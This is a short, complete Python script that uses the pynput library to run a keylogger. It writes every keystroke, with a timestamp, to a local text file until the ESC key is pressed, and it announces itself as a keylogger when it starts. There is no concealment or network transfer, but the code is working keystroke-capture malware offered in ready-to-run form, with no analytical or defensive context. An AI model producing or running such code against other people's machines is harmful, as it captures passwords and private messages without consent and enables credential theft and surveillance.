from datetime import datetime
from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    timestamp = datetime.now().strftime('%Y/%m/%d %H:%M:%S')
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)
    with open(log_file, "a") as f:
        f.write(f"{timestamp} - {key_str}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

print("Keylogger is running... Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
